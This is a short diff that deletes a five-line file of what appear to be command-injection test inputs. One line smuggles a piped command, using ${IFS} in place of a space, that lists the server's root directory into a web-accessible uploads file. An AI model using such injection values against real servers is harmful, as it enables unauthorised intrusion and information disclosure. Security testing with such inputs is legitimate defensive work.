@@ -1,5 +1,0 @@
-echo 'ls'
-2
-3${IFS}|ls -lah / > /var/www/html/uploads/eltron.txt
-4
-5
